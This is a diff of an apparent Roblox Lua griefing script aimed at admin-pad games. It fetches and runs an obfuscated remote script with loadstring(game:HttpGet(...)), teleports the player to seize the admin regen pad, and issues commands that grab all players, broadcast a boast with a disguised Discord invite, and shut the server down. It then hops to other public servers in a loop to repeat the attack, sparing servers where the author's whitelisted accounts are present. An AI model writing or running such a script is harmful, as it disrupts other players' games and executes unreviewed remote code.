@@ -1,5 +1,10 @@
+
+
 local Players = game:GetService("Players")
 local HTTPService = game:GetService("HttpService")
+
+local whitelisttoggle = true
+local whitelisted = {"KohlsHouseNBCFix","KohlsH_Angler","jhone_doee110101","TestAccountKRNL","egglnq","TechnoSniperX","TechnoReaperX","TechncReaperX","egglnqalt","The_NootNootLord","leakproof9853"}
 
 local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
 local lol = game.Players.LocalPlayer
@@ -7,10 +12,10 @@ local lol = game.Players.LocalPlayer
 function say(msg)
 	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
-
- 
- 
 wait(0.2)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
+wait(0.4)
+
 
 local function serverHop()
     while true do
@@ -28,14 +33,12 @@ local function serverHop()
     end
 end 
 
-wait(1)
-local whitelisttoggle = true
-local whitelisted = {"jhone_doee110101","TestAccountKRNL","egglnq","TechnoSniperX","TechnoReaperX","TechncReaperX","egglnqalt","The_NootNootLord","leakproof9853"}
+wait(0.1)
 if whitelisttoggle == true then
     for i,v in pairs(whitelisted) do
         if game.Players:FindFirstChild(v) then
           say("Your server was spared due to the whitelisted user found: "..v)
-          wait(0.4)
+          wait(0.2)
           while wait(0.3) do
           task.spawn(serverHop)
           end
@@ -43,31 +46,29 @@ if whitelisttoggle == true then
     end
 end
 
+local root = game.Players.LocalPlayer.Character.HumanoidRootPart
+root.Anchored = true
+repeat 
+wait()
+root.CFrame = CFrame.new(-7.165, root.Position.Y+2000 , 94.743)
+until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
+root.Anchored = false
+root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0,3,0)
+wait(0.2)
+
+wait(0.1)
 print("no whitelisted people found D:")
-wait(2)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
-wait(0.9)
-
-
-
+wait(0.2)
+game.Players:Chat(".loopgrab all")
 game.Players:Chat(".regen")
-wait(0.4)
-game.Players:Chat(".pads")
-wait(0.3)
-game.Players:Chat(".perm")
-wait(0.4)
+wait(0.1)
 game.Players:Chat(":music 142912516")
 wait(0.4)
-game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
-wait(0.2)
-game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
-wait(0.2)
-game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
-wait(0.2)
-game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
-wait(1.5)
+game.Players:Chat(":h Your server was destroyed by The Noot Noot Lord,  JOIN US  desk o rd . gg/ kK Eq but way")
+wait(0.3)
 game.Players:Chat(".shutdown")
-wait(2) -- this is to prevent server hopping instantly
+
+wait(6) -- this is to prevent server hopping instantly
 
 
 while wait(0.3) do
